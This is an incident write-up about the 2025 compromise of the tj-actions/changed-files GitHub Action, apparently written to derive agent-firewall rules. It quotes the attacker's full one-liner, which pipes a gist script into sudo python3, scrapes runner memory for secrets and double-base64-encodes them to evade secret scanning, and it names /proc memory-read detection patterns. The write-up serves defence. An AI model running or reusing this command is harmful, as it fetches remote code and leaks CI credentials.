# Compromised tj-actions/changed-files GitHub Action dumped CI secrets into public build logs

- Date: 2025-03-14 | Agent/tool: tj-actions/changed-files GitHub Action (used in 23,000+ repos) | Axis: supply

## What happened

On March 14, 2025, the widely used tj-actions/changed-files GitHub Action was compromised. An attacker stole the personal access token of the bot account that maintained the repo. They pushed one malicious commit and repointed every release tag to it, so all pinned and floating versions ran the same bad code. The action then downloaded a Python memory-dump script from a public gist and ran it with sudo. The script read the memory of the GitHub Actions Runner.Worker process, pulled out entries marked as secrets, double-base64-encoded them, and echoed them into the workflow log. On public repositories the logs are readable by anyone, so thousands of repos exposed their CI secrets in plain sight. GitHub assigned CVE-2025-30066. Days later, several actions in the reviewdog organization were found compromised in a related way. No traffic to an attacker server was seen; the public build log was the exfiltration channel.

## How it went wrong

The workflow step was an ordinary `uses: tj-actions/changed-files@v44`. Because every tag pointed at the attacker's commit, the action's code was swapped without any change in the victim repo. The injected step ran this on Linux runners:

`curl -sSf https://gist.githubusercontent.com/.../memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`

At the OS level the runner executed curl with a network_connect to gist.githubusercontent.com, then sudo python3, which opened /proc/<pid>/maps and /proc/<pid>/mem of the Runner.Worker process and read whole memory regions. The decoded secret list was printed to the log, double-encoded to slip past GitHub's secret-scanning push protection. The same `curl | sudo python3` shape works identically on a developer laptop when an agent runs a handy script from a gist.

## What the firewall should learn

The first signal is a direct hit for the builtin `network.download.pipe-to-interpreter` rule: `curl ... | sudo python3` should be approval_required (decision: approval_required). Two more signals are worth new rules. First, exec of sudo python3 (or any debugger-like process) doing file_open reads of /proc/*/mem or /proc/*/maps is process-memory theft; nothing legitimate in a build does that (decision: deny). Second, a download from a raw code-hosting endpoint (gist.githubusercontent.com, raw.githubusercontent.com) followed by execution in the same ancestry is code-from-network and needs approval, even when it is not piped (decision: approval_required).

## Sources

- [StepSecurity: Harden-Runner detection — tj-actions/changed-files action is compromised](https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised)
- [Wiz: GitHub Action tj-actions/changed-files supply chain attack (CVE-2025-30066)](https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066)
- [Snyk: Reconstructing the TJ Actions Changed Files GitHub Actions compromise](https://snyk.io/blog/reconstructing-tj-actions-changed-files-github-actions-compromise/)
- [GitHub advisory GHSA-mrrh-fwg8-r2c3](https://github.com/advisories/ghsa-mrrh-fwg8-r2c3)
